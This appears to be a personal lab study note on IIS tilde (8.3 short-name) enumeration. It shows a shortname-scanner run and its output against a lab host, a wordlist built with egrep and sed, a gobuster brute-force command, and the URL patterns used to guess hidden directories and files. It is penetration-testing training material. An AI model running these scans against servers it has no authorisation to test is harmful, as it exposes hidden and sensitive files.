IIS tilde directory enumeration is a technique utilised to uncover hidden files, directories, and short file names (aka the `8.3 format`) on some versions of Microsoft Internet Information Services (IIS) web servers.

When a file or folder is created on an IIS server, Windows generates a short file name in the `8.3 format`, consisting of eight characters for the file name, a period, and three characters for the extension.

## Installing iis brute tool
there is a tool called `IIS-ShortName-Scanner` that can automate this task. You can find it on GitHub at the following link: [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner). To use `IIS-ShortName-Scanner`, you will need to install Oracle Java on either Pwnbox or your local VM. Details can be found in the following link. [How to Install Oracle Java](https://ubuntuhandbook.org/index.php/2022/03/install-jdk-18-ubuntu/)
# Enumeration
### nmap
```shell-session
80/tcp open  http    Microsoft IIS httpd 7.5
```
`
`run tool`
```shell-session
$ java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
|_ Result: Vulnerable!
 Extra information:
  |_ Number of sent requests: 553
  |_ Identified directories: 2
    |_ ASPNET~1
    |_ UPLOAD~1
  |_ Identified files: 3
    |_ CSASPX~1.CS
      |_ Actual extension = .CS
    |_ CSASPX~1.CS??
    |_ TRANSF~1.ASP
```
## now we want to access Transf-1.ASP
but unfortunately for us, the target does not permit `GET` access to `http://10.129.204.231/TRANSF~1.ASP` so lets brute force a valid full file name.

create a wordlist with `trasnf*`
```shell-session
$ egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```
`sed 's/^[^:]*://'` -> replaces username:pass with just user and pass under wordlist like
```
cat dog_win 
cat:cat_win
with sed

```
`view wordlist, confirm transf keyword`
```
└─$ tail -n 5 /tmp/list.txt                                                                   
transferral
transferotype
transferent
transferably
transfeature
```

you can use `gobuster` to enumerate all files/dirs in the target.
```shell-session
$ gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
```


## Detecting shortname
The enumeration process starts by sending requests with various characters following the tilde:
```http
http://example.com/~a
http://example.com/~b
http://example.com/~s
```
further refining the short name to "se". Further requests are sent, such as:

```http
http://example.com/~sec
http://example.com/~sed
http://example.com/~see
```
When a request is sent to `http://example.com/~s`, the server replies with a `200 OK`

Continuing this procedure, the short name `secret~1` is eventually discovered when the server returns a `200 OK`
## Enumerating the files inside the shortname dir
Once the short name `secret~1` dir is identified, enumeration of specific file names within that path can be performed, potentially exposing sensitive documents.

For instance, if the short name `secret~1` is determined for the concealed directory SecretDocuments, files in that directory can be accessed by submitting requests such as:

```http
http://example.com/secret~1/somefile.txt
http://example.com/secret~1/anotherfile.docx
```

files inside can also be shortnamed
```http
http://example.com/secret~1/somefi~1.txt
```
### collisions
if two files named `somefile.txt` and `somefile1.txt` exist in the same directory, their 8.3 short file names would be:

- `somefi~1.txt` for `somefile.txt`
- `somefi~2.txt` for `somefile1.txt`

![[Pasted image 20250706080053.png| 600 ]]